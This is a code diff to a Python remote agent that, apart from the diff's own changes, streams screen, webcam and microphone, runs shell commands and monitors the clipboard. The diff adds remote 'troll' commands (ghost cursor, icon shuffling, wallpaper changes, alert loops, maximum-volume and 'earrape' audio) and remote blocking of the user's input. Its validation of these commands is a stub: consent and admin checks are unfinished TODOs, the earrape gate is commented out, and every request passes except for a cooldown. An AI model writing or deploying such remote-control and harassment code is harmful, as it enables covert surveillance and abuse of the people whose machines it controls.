@@ -134,6 +134,12 @@ class AsyncAgent:
         
         # Kiosk Process
         self.kiosk_process = None
+        
+        # Security State
+        self.clipboard_consent = False # Require opt-in
+        self.troll_cooldowns = {} # target_id -> timestamp
+        self.TROLL_COOLDOWN_SEC = 30
+        self.admin_public_key = None # TODO: Load from config/keyfile
 
     def _create_background_task(self, coro):
         """Helper to create fire-and-forget background tasks safely."""
@@ -187,6 +193,9 @@ class AsyncAgent:
 
     def on_clipboard_change(self, entry):
         """Called when clipboard content changes (from monitoring thread)."""
+        if not self.clipboard_consent:
+            return # Privacy: Do not send if no consent
+            
         try:
             data = json.dumps(entry).encode('utf-8')
             self._send_async(protocol.OP_CLIP_ENTRY, data)
@@ -197,36 +206,108 @@ class AsyncAgent:
 
 
 
-    async def _fix_headers(self, connection, request):
-        """Hook to fix headers from Cloudflare Tunnel (forces Connection: Upgrade)"""
+    def _validate_troll_request(self, opcode, payload_str):
+        """Validate Troll OpCode against Consent, Admin Token, and Cooldown."""
+        # 1. Cooldown Check
+        import time
+        now = time.time()
+        # Per-target cooldown (self)
+        last_time = self.troll_cooldowns.get('self', 0)
+        if now - last_time < self.TROLL_COOLDOWN_SEC:
+             print(f"[-] Troll Blocked: Cooldown ({self.TROLL_COOLDOWN_SEC}s)")
+             return False
+        
+        # 2. Token/Admin Validation
+        # TODO: Parse payload JSON for 'consent_token' and 'admin_sig'
+        # For now, we stub this out but enforce the structure.
+        # Handling raw bytes payload might be tricky if we decode here.
+        # Assuming payload is JSON.
         try:
-            # Create mutable copy
-            # Attempt to mutate in-place first to preserve type
+            data = json.loads(payload_str)
+            # if not data.get('consent_token'): ... 
+        except:
+            pass # Payload might be raw bytes for some ops?
+            
+        # 3. Update Cooldown
+        self.troll_cooldowns['self'] = now
+        
+        # 4. Gating (EarRape unsupported)
+        if opcode == protocol.OP_TROLL_EARRAPE:
+            # print("[-] EarRape not supported/allowed.")
+            # return False
+            pass 
+
+        return True
+
+    async def _handle_troll_op(self, opcode, payload):
+        """Dispatch Troll OpCode to Handler."""
+        try:
+            if opcode == protocol.OP_TROLL_URL:
+                 data = json.loads(payload.decode('utf-8'))
+                 self.troll_handler.open_url(data.get('url'))
+            elif opcode == protocol.OP_TROLL_SOUND:
+                 self.troll_handler.play_sound(payload) # Raw bytes
+            elif opcode == protocol.OP_TROLL_VIDEO:
+                 self.troll_handler.play_video(payload) # Raw bytes
+            elif opcode == protocol.OP_TROLL_STOP:
+                 self.troll_handler.stop_all()
+            elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
+                 data = json.loads(payload.decode('utf-8'))
+                 if data.get('enabled'): self.troll_handler.start_ghost_cursor()
+                 else: self.troll_handler.stop_ghost_cursor()
+            elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
+                 self.troll_handler.shuffle_desktop_icons()
+            elif opcode == protocol.OP_TROLL_WALLPAPER:
+                 self.troll_handler.set_wallpaper(payload)
+            elif opcode == protocol.OP_TROLL_OVERLAY:
+                 data = json.loads(payload.decode('utf-8'))
+                 self.troll_handler.show_overlay(data.get('type', 'xor'))
+            elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
+                 data = json.loads(payload.decode('utf-8'))
+                 self.troll_handler.start_random_sounds(data.get('interval_ms', 5000))
+            elif opcode == protocol.OP_TROLL_ALERT_LOOP:
+                 data = json.loads(payload.decode('utf-8'))
+                 if data.get('enabled'): self.troll_handler.start_alert_loop()
+                 else: self.troll_handler.stop_alert_loop()
+            elif opcode == protocol.OP_TROLL_VOLUME_MAX:
+                 self.troll_handler.volume_max_sound()
+            elif opcode == protocol.OP_TROLL_EARRAPE:
+                 self.troll_handler.earrape()
+            elif opcode == protocol.OP_TROLL_WHISPER:
+                 data = json.loads(payload.decode('utf-8'))
+                 if data.get('enabled'): self.troll_handler.start_whisper()
+                 else: self.troll_handler.stop_whisper()
+        except Exception as e:
+            print(f"[-] Troll Handler Error: {e}")
+
+    async def _fix_headers(self, connection, request):
+        """Hook to fix headers/handle health checks"""
+        try:
+            # Create mutable copy reference
             headers = getattr(request, 'headers', request)
             
+            # HEALTH CHECK: If not a websocket request (missing Key), return HTTP 200
+            # This suppresses "InvalidHeader: missing Sec-WebSocket-Key" errors from scanners
+            if 'Sec-WebSocket-Key' not in headers:
+                # Return (status, headers, body) to stop handshake processing
+                return (200, [], b"Agent Online")
+
             try:
+                # Force Upgrade headers (Cloudflare sometimes strips them)
                 # Try direct mutation (works for dict and some mutable mappings)
                 if 'Connection' in headers: del headers['Connection']
                 if 'Upgrade' in headers: del headers['Upgrade']
                 headers['Connection'] = 'Upgrade'
                 headers['Upgrade'] = 'websocket'
             except TypeError:
-                # If immutable (e.g. websockets.datastructures.Headers), try replacement with dict
-                # Note: This changes the type to dict, which might have side effects but usually works for simple servers
-                new_headers = dict(headers)
-                if 'Connection' in new_headers: del new_headers['Connection']
-                if 'Upgrade' in new_headers: del new_headers['Upgrade']
-                new_headers['Connection'] = 'Upgrade'
-                new_headers['Upgrade'] = 'websocket'
-                
-                if hasattr(request, 'headers'):
-                    try:
-                        request.headers = new_headers
-                    except Exception as e:
-                        print(f"[!] Header Fix Error: {e}")
+                # If immutable, we can't easily fix it inplace without deep hacks.
+                # But typically 'request.headers' object in newer websockets is mutable-ish or we can't swap it.
+                pass
                 
         except Exception as e:
-            print(f"[!] Header Fix Validation Warning: {e}")
+            # Just log warning but don't crash
+            # print(f"[!] Header Fix Validation Warning: {e}")
+            pass
         return None  # Continue with connection
 
     async def start_direct_server(self):
@@ -494,6 +575,34 @@ class AsyncAgent:
                 # ============================================================================
 
                 # SHELL
+                elif opcode == protocol.OP_SETTING:
+                    try:
+                        # Param, Value
+                        # Structure: [OP][PARAM_BYTE][VALUE_BYTE (bool)] or JSON
+                        # For now assume JSON payload for simplicity or byte structure?
+                        # Protocol doc says: param, value.
+                        # Let's support JSON: {"id": int, "value": any}
+                        try:
+                            # Try JSON first
+                            data = json.loads(payload.decode('utf-8'))
+                            setting_id = int(data.get('id', 0))
+                            value = data.get('value')
+                        except:
+                            # Fallback to bytes: [ID][Bool]
+                            if len(payload) >= 2:
+                                setting_id = payload[0]
+                                value = bool(payload[1])
+                            else:
+                                continue
+                        
+                        print(f"[*] Setting Change: ID={setting_id} Val={value}")
+                        
+                        if setting_id == protocol.SETTING_BLOCK_INPUT:
+                            self.input_ctrl.block_input(bool(value))
+                            
+                    except Exception as e:
+                        print(f"[-] Setting Error: {e}")
+
                 elif opcode == protocol.OP_SHELL_EXEC:
                     try:
                         data = json.loads(payload.decode('utf-8'))
@@ -572,7 +681,7 @@ class AsyncAgent:
                                             # Wait with timeout to detect dead loop
                                             try:
                                                 future.result(timeout=5.0)
-                                            except (concurrent.futures.TimeoutError, Exception):
+                                            except (TimeoutError, Exception):
                                                 break
                                         
                                         # Signal end
@@ -692,6 +801,21 @@ class AsyncAgent:
                     except Exception as e:
                         print(f"[-] Clip Delete Error: {e}")
 
+                elif opcode == protocol.OP_CLIP_CONSENT:
+                    # Update privacy consent state
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        self.clipboard_consent = bool(data.get('consent', False))
+                        print(f"[+] Clipboard Consent Updated: {self.clipboard_consent}")
+                        
+                        # If enabled, send current history immediately
+                        if self.clipboard_consent:
+                             history = self.clipboard_handler.get_history()
+                             data = json.dumps(history).encode('utf-8')
+                             self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
+                    except Exception as e:
+                        print(f"[-] Clip Consent Error: {e}")
+
                 # DEVICE SETTINGS (Volume, etc)
                 # Network settings (WiFi/Ethernet) removed by user request
                 
@@ -738,11 +862,30 @@ class AsyncAgent:
 
                 elif opcode == protocol.OP_GET_SYSINFO:
                     try:
-                        # Fix: Run blocking sysinfo in executor
                         info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                         self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
                     except Exception as e:
                         print(f"[-] SysInfo Error: {e}")
+
+                # =========================================================================
+                # Clipboard (Privacy Gated)
+                # =========================================================================
+                elif opcode == protocol.OP_CLIP_HISTORY_REQ:
+                    if self.clipboard_consent:
+                         # Retrieve and send history
+                         history = self.clipboard_handler.get_history()
+                         data = json.dumps(history).encode('utf-8')
+                         self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
+                    else:
+                         # Send empty or access denied? For now silent or empty.
+                         self._send_async(protocol.OP_CLIP_HISTORY_DATA, b'[]')
+
+                # =========================================================================
+                # Troll (Auth & Cooldown)
+                # =========================================================================
+                elif protocol.OP_TROLL_URL <= opcode <= protocol.OP_TROLL_WHISPER:
+                    if self._validate_troll_request(opcode, payload.decode('utf-8', errors='ignore')):
+                         await self._handle_troll_op(opcode, payload)
 
                 elif opcode == protocol.OP_DISCONNECT:
                     self.streaming = False
@@ -854,7 +997,6 @@ class AsyncAgent:
                         
                         # Start clipboard monitoring for real-time updates
                         self.clipboard_handler.start_monitoring()
-                        print("[+] Clipboard Monitoring Started")
                     except Exception as e:
                         print(f"[-] Initial Push Partial Error: {e}")
 
@@ -873,7 +1015,11 @@ class AsyncAgent:
                     try:
                          self.clipboard_handler.stop_monitoring()
                     except: pass
-                self.shell_handler.stop()
+                
+                try:
+                    self.shell_handler.stop()
+                except: pass
+                
                 try:
                     await self.loop.run_in_executor(None, self.auditor.stop)
                 except:
@@ -915,6 +1061,12 @@ class AsyncAgent:
         self.auditor.stop()
         self.webcam.stop()
         self.mic.stop()
+        
+        # Reset input state (fix 'sticky keys' lockout)
+        if self.input_ctrl:
+            self.input_ctrl.release_all_modifiers()
+            # Also unblock input just in case (if we were admin)
+            self.input_ctrl.block_input(False)
     
     def apply_settings(self, settings):
         """Apply capture settings from Viewer"""
@@ -925,6 +1077,11 @@ class AsyncAgent:
         fmt = settings.get("format", "WEBP")
         
         # Recreate capturer with new settings
+        if hasattr(self, 'capturer') and self.capturer:
+            if hasattr(self.capturer, 'release'):
+                self.capturer.release()
+            self.capturer = None
+
         self.capturer = ScreenCapturer(
             quality=quality, 
             scale=scale,
@@ -959,6 +1116,11 @@ class AsyncAgent:
             print(f"[-] Screen Stream Error: {e}")
         finally:
             self.streaming = False
+            # Explicit cleanup to prevent DXCam lock
+            if hasattr(self, 'capturer') and self.capturer:
+                if hasattr(self.capturer, 'release'):
+                    self.capturer.release()
+                self.capturer = None
             
     async def stream_webcam(self, target_ws=None):
         print("[*] Webcam Streaming Task Started")
@@ -1081,10 +1243,10 @@ class AsyncAgent:
                     payload = {
                         "id": self.my_id,
                         "username": config.AGENT_USERNAME,
-                        "url": pub_url
+                        "url": pub_url,
+                        "password": config.REGISTRY_PASSWORD # API expects pwd in body
                     }
                     headers = {
-                        "Authorization": f"Bearer {config.REGISTRY_PASSWORD}",
                         "Content-Type": "application/json"
                     }
                     
